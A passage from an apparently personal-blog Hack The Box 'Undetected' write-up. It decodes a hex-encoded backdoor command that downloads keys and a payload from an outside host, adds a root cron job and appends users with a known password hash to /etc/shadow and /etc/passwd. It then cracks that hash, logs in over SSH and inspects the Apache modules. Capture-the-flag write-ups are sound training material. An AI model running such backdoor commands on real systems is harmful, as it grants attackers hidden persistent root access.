=(</span><br><span class="line">[+] got r00t ^_^</span><br><span class="line">[-] unshare(CLONE_NEWUSER)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>Let’s convert this hex to ascii.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/undetected]</span><br><span class="line">└─<span class="comment"># echo &#x27;776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b&#x27; | xxd -r -p</span></span><br><span class="line">wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; <span class="built_in">chmod</span> 755 /var/lib/.main; <span class="built_in">echo</span> <span class="string">&quot;* 3 * * * root /var/lib/.main&quot;</span> &gt;&gt; /etc/crontab; awk -F<span class="string">&quot;:&quot;</span> <span class="string">&#x27;$7 == &quot;/bin/bash&quot; &amp;&amp; $3 &gt;= 1000 &#123;system(&quot;echo &quot;$1&quot;1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow&quot;)&#125;&#x27;</span> /etc/passwd; awk -F<span class="string">&quot;:&quot;</span> <span class="string">&#x27;$7 == &quot;/bin/bash&quot; &amp;&amp; $3 &gt;= 1000 &#123;system(&quot;echo &quot;$1&quot; &quot;$3&quot; &quot;$6&quot; &quot;$7&quot; &gt; users.txt&quot;)&#125;&#x27;</span> /etc/passwd; <span class="keyword">while</span> <span class="built_in">read</span> -r user group home shell _; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$user</span>&quot;</span>1<span class="string">&quot;:x:<span class="variable">$group</span>:<span class="variable">$group</span>:,,,:<span class="variable">$home</span>:<span class="variable">$shell</span>&quot;</span> &gt;&gt; /etc/passwd; <span class="keyword">done</span> &lt; users.txt; <span class="built_in">rm</span> users.txt;</span><br></pre></td></tr></table></figure>
+
+<p>We have bash command which’s doing downloading and appending. We also have a password hash. There are slashes to escape $ character, remove those and crack it.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe -a 0 -m 1800 password.txt rockyou.txt</span><br><span class="line"></span><br><span class="line">$6$zS7ykHfFMg3aYht4<span class="variable">$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk</span>.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:ihatehackers</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))</span><br><span class="line">Hash.Target......: $6$zS7ykHfFMg3aYht4<span class="variable">$1IUrhZanRuDZhf1oIdnoOvXoolKmlwb</span>...Q0T9n/</span><br><span class="line">Time.Started.....: Thu Feb 24 09:37:14 2022 (1 sec)</span><br><span class="line">Time.Estimated...: Thu Feb 24 09:37:15 2022 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:    55466 H/s (13.14ms) @ Accel:256 Loops:256 Thr:64 Vec:1</span></span><br><span class="line">Speed.<span class="comment">#3.........:      784 H/s (13.65ms) @ Accel:64 Loops:8 Thr:128 Vec:1</span></span><br><span class="line">Speed.<span class="comment">#*.........:    56250 H/s</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 81920/14344385 (0.57%)</span><br><span class="line">Rejected.........: 0/81920 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344385 (0.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:4864-5000</span></span><br><span class="line">Restore.Sub.<span class="comment">#3...: Salt:0 Amplifier:0-1 Iteration:704-712</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: compu -&gt; KATKAT</span></span><br><span class="line">Candidates.<span class="comment">#3....: 123456 -&gt; whitetiger</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Temp: 58c Util: 86% Core: 549MHz Mem:2232MHz Bus:8</span></span><br><span class="line">Hardware.Mon.<span class="comment">#3..: N/A</span></span><br></pre></td></tr></table></figure>
+
+<p>We got the password. Let’s try to use it on one of the two stevens account.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/undetected]</span><br><span class="line">└─<span class="comment"># ssh steven@undetected.htb</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;undetected.htb (10.10.11.146)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:nlNVR+zv5C+jYiWJYQ8BwBjs3pDuXfYSUK17IcTTvTs.</span></span><br><span class="line"><span class="string">This key is not known by any other names</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>undetected.htb<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">steven@undetected.htb&#x27;</span>s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">steven@undetected.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                                                                                                                              </span></span><br><span class="line"><span class="string">┌──(root💀kali)-[~/hackthebox/machine/undetected]</span></span><br><span class="line"><span class="string">└─# ssh steven1@undetected.htb                                                                                                          130 ⨯</span></span><br><span class="line"><span class="string">steven1@undetected.htb&#x27;</span>s password: </span><br><span class="line">steven@production:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(steven) gid=1000(steven) <span class="built_in">groups</span>=1000(steven)</span><br><span class="line">steven@production:~$ <span class="built_in">whoami</span></span><br><span class="line">steven</span><br><span class="line">steven@production:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">bc73c6098897d8437244705ce525923d</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2156.jpg"></li>
+</ul>
+<h1 id="get-root"><a href="#get-root" class="headerlink" title="get root"></a>get root</h1><p>Password worked on ‘steven1’ user, not ‘steven’. When we ran Linpeas first time, it gave this below information about mail.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ Mails (<span class="built_in">limit</span> 50)</span><br><span class="line">17793 4 -rw-rw---- 1 steven mail 966 Jul 25 2021</span><br><span class="line">/var/mail/steven</span><br><span class="line">17793 4 -rw-rw---- 1 steven mail 966 Jul 25 2021</span><br><span class="line">/var/spool/mail/steven</span><br></pre></td></tr></table></figure>
+
+<p>www-data didn’t have permission to read, but now we have. Let’s read it.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">steven@production:~$ <span class="built_in">cat</span> /var/mail/steven</span><br><span class="line">From root@production  Sun, 25 Jul 2021 10:31:12 GMT</span><br><span class="line">Return-Path: &lt;root@production&gt;</span><br><span class="line">Received: from production (localhost [127.0.0.1])</span><br><span class="line">        by production (8.15.2/8.15.2/Debian-18) with ESMTP <span class="built_in">id</span> 80FAcdZ171847</span><br><span class="line">        <span class="keyword">for</span> &lt;steven@production&gt;; Sun, 25 Jul 2021 10:31:12 GMT</span><br><span class="line">Received: (from root@localhost)</span><br><span class="line">        by production (8.15.2/8.15.2/Submit) <span class="built_in">id</span> 80FAcdZ171847;</span><br><span class="line">        Sun, 25 Jul 2021 10:31:12 GMT</span><br><span class="line">Date: Sun, 25 Jul 2021 10:31:12 GMT</span><br><span class="line">Message-Id: &lt;202107251031.80FAcdZ171847@production&gt;</span><br><span class="line">To: steven@production</span><br><span class="line">From: root@production</span><br><span class="line">Subject: Investigations</span><br><span class="line"></span><br><span class="line">Hi Steven.</span><br><span class="line"></span><br><span class="line">We recently updated the system but are still experiencing some strange behaviour with the Apache service.</span><br><span class="line">We have temporarily moved the web store and database to another server whilst investigations are underway.</span><br><span class="line">If <span class="keyword">for</span> any reason you need access to the database or web application code, get <span class="keyword">in</span> <span class="built_in">touch</span> with Mark and he</span><br><span class="line">will generate a temporary password <span class="keyword">for</span> you to authenticate to the temporary server.</span><br><span class="line"></span><br><span class="line">Thanks,</span><br><span class="line">sysadmin</span><br></pre></td></tr></table></figure>
+
+<p>This mail mentions about ‘Apache Service’ is acting strangely, so they have moved DB to somewhere else. Apache service directory is located in ‘&#x2F;usr&#x2F;lib’.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">steven@production:~$ <span class="built_in">ls</span> -la /usr/lib/apache2/</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x  3 root root  4096 Jul  5  2021 .</span><br><span class="line">drwxr-xr-x 82 root root  4096 Feb  8 19:59 ..</span><br><span class="line">drwxr-xr-x  2 root root 20480 Jan 28 21:05 modules</span><br></pre></td></tr></table></figure>
+
+<p>We have read and execute access. Let’s look into that ‘modules’ directory.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">steven@production:/usr/lib/apache2/modules$ <span class="built_in">ls</span></span><br><span class="line">httpd.exp               mod_autoindex.so       mod_ext_filter.so           mod_mpm_worker.so      mod_session.so</span><br><span class="line">libphp7.4.so            mod_brotli.so          mod_file_cache.so           mod_negotiation.so     mod_session_cookie.so</span><br><span class="line">mod_access_compat.so    mod_bucketeer.so       mod_filter.so               mod_proxy.so           mod_session_crypto.so</span><br><span class="line">mod_actions.so          mod_buffer.so          mod_headers.so              mod_proxy_ajp.so       mod_session_dbd.so</span><br><span class="line">mod_alias.so            mod_cache.so           mod_heartbeat.so            mod_proxy_balancer.so  mod_setenvif.so</span><br><span class="line">mod_allowmethods.so     mod_cache_disk.so      mod_heartmonitor.so         mod_proxy_connect.so   mod_slotmem_plain.so</span><br><span class="line">mod_asis.so             mod_cache_socache.so   mod_http2.so                mod_proxy_express.so   mod_slotmem_shm.so</span><br><span class="line">mod_auth_basic.so       mod_case_filter.so     mod_ident.so                mod_proxy_fcgi.so      mod_socache_dbm.so</span><br><span class="line">mod_auth_digest.so      mod_case_filter_in.so  mod_imagemap.so             mod_proxy_fdpass.so    mod_socache_memcache.so</span><br><span class="line">mod_auth_form.so        mod_cern_meta.so       mod_include.so              mod_proxy_ftp.so       mod_socache_redis.so</span><br><span class="line">mod_authn_anon.so       mod_cgi.so             mod_info.so                 mod_proxy_hcheck.so    mod_socache_shmcb.so</span><br><span class="line">mod_authn_core.so       mod_cgid.so            mod_lbmethod_bybusyness.so  mod_proxy_html.so      mod_speling.so</span><br><span class="line">mod_authn_dbd.so        mod_charset_lite.so    mod_lbmethod_byrequests.so  mod_proxy_http.so      mod_ssl.so</span><br><span class="line">mod_authn_dbm.so        mod_data.so            mod_lbmethod_bytraffic.so   mod_proxy_http2.so     mod_status.so</span><br><span class="line">mod_authn_file.so       mod_dav.so             mod_lbmethod_heartbeat.so   mod_proxy_scgi.so      mod_substitute.so</span><br><span class="line">mod_authn_socache.so    mod_dav_fs.so          mod_ldap.so                 mod_proxy_uwsgi.so     mod_suexec.so</span><br><span class="line">mod_authnz_fcgi.so      mod_dav_lock.so        mod_log_debug.so            mod_proxy_wstunnel.so  mod_unique_id.so</span><br><span class="line">mod_authnz_ldap.so      mod_dbd.so             mod_log_forensic.so         mod_ratelimit.so       mod_userdir.so</span><br><span class="line">mod_authz_core.so       mod_deflate.so         mod_lua.so                  mod_reader.so          mod_usertrack.so</span><br><span class="line">mod_authz_dbd.so        mod_dialup.so          mod_macro.so                mod_reflector.so       mod_vhost_alias.so</span><br><span class="line">mod_authz_dbm.so        mod_dir.so             mod_md.so                   mod_remoteip.so        mod_xml2enc.so</span><br><span class="line">mod_authz_groupfile.so  mod_dumpio.so          mod_mime.so                 mod_reqtimeout.so</span><br><span class="line">mod_authz_host.so       mod_echo.so            mod_mime_magic.so           mod_request.so</span><br><span class="line">mod_authz_owner.so      mod_env.so             mod_mpm_event.so            mod_rewrite.so</span><br><span class="line">mod_authz_user.so       mod_expires.so         mod_mpm_prefork.so          mod_sed.so</span><br></pre></td></tr></table></figure>
+
+<p>There are two many file, let’s sort them based on creation time.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">steven@production:/usr/lib/apache2/modules$ <span class="built_in">ls</span> --full-time -i | <span class="built_in">sort</span> -u</span><br><span class="line"> 2050 -rw-r--r-- 1 root root   34800 2021-05-17 07:10:04.000000000 +0000 mod_reader.so</span><br><span class="line"> 5093 -rw-r--r-- 1 root root 4625776 2021-11-25 23:16:22.000000000 +0000 libphp7.4.so</span><br><span class="line"> 7990 -rw-r--r-- 1 root root   15925 2022-01-05 14:49:56.000000000 +0000 httpd.exp</span><br><span class="line"> 7997 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_access_compat.so</span><br><span class="line"> 8000 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_actions.so</span><br><span class="line"> 8002 -rw-r--r-- 1 root root   18640 2022-01-05 14:49:56.000000000 +0000 mod_alias.so</span><br><span class="line"> 8004 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_allowmethods.so</span><br><span class="line"> 8006 -rw-r--r-- 1 root root   14464 2022-01-05 14:49:56.000000000 +0000 mod_asis.so</span><br><span class="line"> 8008 -rw-r--r-- 1 root root   18640 2022-01-05 14:49:56.000000000 +0000 mod_auth_basic.so</span><br><span class="line"> 8010 -rw-r--r-- 1 root root   39120 2022-01-05 14:49:56.000000000 +0000 mod_auth_digest.so</span><br><span class="line"> 8013 -rw-r--r-- 1 root root   35024 2022-01-05 14:49:56.000000000 +0000 mod_auth_form.so</span><br><span class="line"> 8015 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_authn_anon.so</span><br><span class="line"> 8017 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_authn_core.so</span><br><span class="line"> 8019 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_authn_dbd.so</span><br><span class="line"> 8021 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_authn_dbm.so</span><br><span class="line"> 8023 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_authn_file.so</span><br><span class="line"> 8024 -rw-r--r-- 1 root root   22768 2022-01-05 14:49:56.000000000 +0000 mod_authn_socache.so</span><br><span class="line"> 8025 -rw-r--r-- 1 root root   35024 2022-01-05 14:49:56.000000000 +0000 mod_authnz_fcgi.so</span><br><span class="line"> 8026 -rw-r--r-- 1 root root   55528 2022-01-05 14:49:56.000000000 +0000 mod_authnz_ldap.so</span><br><span class="line"> 8027 -rw-r--r-- 1 root root   30928 2022-01-05 14:49:56.000000000 +0000 mod_authz_core.so</span><br><span class="line"> 8028 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_authz_dbd.so</span><br><span class="line"> 8029 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_authz_dbm.so</span><br><span class="line"> 8030 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_authz_groupfile.so</span><br><span class="line"> 8031 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_authz_host.so</span><br><span class="line"> 8032 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_authz_owner.so</span><br><span class="line"> 8033 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_authz_user.so</span><br><span class="line"> 8035 -rw-r--r-- 1 root root   43216 2022-01-05 14:49:56.000000000 +0000 mod_autoindex.so</span><br><span class="line"> 8036 -rw-r--r-- 1 root root   22736 2022-01-05 14:49:56.000000000 +0000 mod_brotli.so</span><br><span class="line"> 8037 -rw-r--r-- 1 root root   14464 2022-01-05 14:49:56.000000000 +0000 mod_bucketeer.so</span><br><span class="line"> 8038 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_buffer.so</span><br><span class="line"> 8039 -rw-r--r-- 1 root root   80176 2022-01-05 14:49:56.000000000 +0000 mod_cache.so</span><br><span class="line"> 8040 -rw-r--r-- 1 root root   39120 2022-01-05 14:49:56.000000000 +0000 mod_cache_disk.so</span><br><span class="line"> 8041 -rw-r--r-- 1 root root   39152 2022-01-05 14:49:56.000000000 +0000 mod_cache_socache.so</span><br><span class="line"> 8042 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_case_filter.so</span><br><span class="line"> 8043 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_case_filter_in.so</span><br><span class="line"> 8044 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_cern_meta.so</span><br><span class="line"> 8045 -rw-r--r-- 1 root root   30928 2022-01-05 14:49:56.000000000 +0000 mod_cgi.so</span><br><span class="line"> 8046 -rw-r--r-- 1 root root   43216 2022-01-05 14:49:56.000000000 +0000 mod_cgid.so</span><br><span class="line"> 8047 -rw-r--r-- 1 root root   26832 2022-01-05 14:49:56.000000000 +0000 mod_charset_lite.so</span><br><span class="line"> 8048 -rw-r--r-- 1 root root   14464 2022-01-05 14:49:56.000000000 +0000 mod_data.so</span><br><span class="line"> 8049 -rw-r--r-- 1 root root  104656 2022-01-05 14:49:56.000000000 +0000 mod_dav.so</span><br><span class="line"> 8050 -rw-r--r-- 1 root root   59600 2022-01-05 14:49:56.000000000 +0000 mod_dav_fs.so</span><br><span class="line"> 8051 -rw-r--r-- 1 root root   18640 2022-01-05 14:49:56.000000000 +0000 mod_dav_lock.so</span><br><span class="line"> 8054 -rw-r--r-- 1 root root   26832 2022-01-05 14:49:56.000000000 +0000 mod_dbd.so</span><br><span class="line"> 8055 -rw-r--r-- 1 root root   39120 2022-01-05 14:49:56.000000000 +0000 mod_deflate.so</span><br><span class="line"> 8056 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_dialup.so</span><br><span class="line"> 8057 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_dir.so</span><br><span class="line"> 8058 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_dumpio.so</span><br><span class="line"> 8059 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_echo.so</span><br><span class="line"> 8062 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_env.so</span><br><span class="line"> 8064 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_expires.so</span><br><span class="line"> 8082 -rw-r--r-- 1 root root   26832 2022-01-05 14:49:56.000000000 +0000 mod_ext_filter.so</span><br><span class="line"> 8083 -rw-r--r-- 1 root root   14592 2022-01-05 14:49:56.000000000 +0000 mod_file_cache.so</span><br><span class="line"> 8084 -rw-r--r-- 1 root root   22736 2022-01-05 14:49:56.000000000 +0000 mod_filter.so</span><br><span class="line"> 8085 -rw-r--r-- 1 root root   30928 2022-01-05 14:49:56.000000000 +0000 mod_headers.so</span><br><span class="line"> 8092 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_heartbeat.so</span><br><span class="line"> 8093 -rw-r--r-- 1 root root   30928 2022-01-05 14:49:56.000000000 +0000 mod_heartmonitor.so</span><br><span class="line"> 8094 -rw-r--r-- 1 root root  253632 2022-01-05 14:49:56.000000000 +0000 mod_http2.so</span><br><span class="line"> 8095 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_ident.so</span><br><span class="line"> 8096 -rw-r--r-- 1 root root   18640 2022-01-05 14:49:56.000000000 +0000 mod_imagemap.so</span><br><span class="line"> 8097 -rw-r--r-- 1 root root   55504 2022-01-05 14:49:56.000000000 +0000 mod_include.so</span><br><span class="line"> 8214 -rw-r--r-- 1 root root   26832 2022-01-05 14:49:56.000000000 +0000 mod_info.so</span><br><span class="line"> 8261 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_lbmethod_bybusyness.so</span><br><span class="line"> 8262 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_lbmethod_byrequests.so</span><br><span class="line"> 8300 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_lbmethod_bytraffic.so</span><br><span class="line"> 8389 -rw-r--r-- 1 root root   22736 2022-01-05 14:49:56.000000000 +0000 mod_lbmethod_heartbeat.so</span><br><span class="line"> 8505 -rw-r--r-- 1 root root   84176 2022-01-05 14:49:56.000000000 +0000 mod_ldap.so</span><br><span class="line"> 8509 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_log_debug.so</span><br><span class="line"> 8510 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_log_forensic.so</span><br><span class="line"> 8511 -rw-r--r-- 1 root root  134544 2022-01-05 14:49:56.000000000 +0000 mod_lua.so</span><br><span class="line"> 8782 -rw-r--r-- 1 root root   18640 2022-01-05 14:49:56.000000000 +0000 mod_macro.so</span><br><span class="line"> 8792 -rw-r--r-- 1 root root  260672 2022-01-05 14:49:56.000000000 +0000 mod_md.so</span><br><span class="line"> 8793 -rw-r--r-- 1 root root   26832 2022-01-05 14:49:56.000000000 +0000 mod_mime.so</span><br><span class="line"> 8794 -rw-r--r-- 1 root root   30928 2022-01-05 14:49:56.000000000 +0000 mod_mime_magic.so</span><br><span class="line"> 8795 -rw-r--r-- 1 root root   67792 2022-01-05 14:49:56.000000000 +0000 mod_mpm_event.so</span><br><span class="line"> 8796 -rw-r--r-- 1 root root   39120 2022-01-05 14:49:56.000000000 +0000 mod_mpm_prefork.so</span><br><span class="line"> 9473 -rw-r--r-- 1 root root   47312 2022-01-05 14:49:56.000000000 +0000 mod_mpm_worker.so</span><br><span class="line"> 9517 -rw-r--r-- 1 root root   39120 2022-01-05 14:49:56.000000000 +0000 mod_negotiation.so</span><br><span class="line"> 9636 -rw-r--r-- 1 root root  133888 2022-01-05 14:49:56.000000000 +0000 mod_proxy.so</span><br><span class="line"> 9675 -rw-r--r-- 1 root root   55504 2022-01-05 14:49:56.000000000 +0000 mod_proxy_ajp.so</span><br><span class="line"> 9679 -rw-r--r-- 1 root root   59600 2022-01-05 14:49:56.000000000 +0000 mod_proxy_balancer.so</span><br><span class="line"> 9787 -rw-r--r-- 1 root root   18640 2022-01-05 14:49:56.000000000 +0000 mod_proxy_connect.so</span><br><span class="line"> 9799 -rw-r--r-- 1 root root   14544 2022-01-05 14:49:56.000000000 +0000 mod_proxy_express.so</span><br><span class="line"> 9820 -rw-r--r-- 1 root root   35024 2022-01-05 14:49:56.000000000 +0000 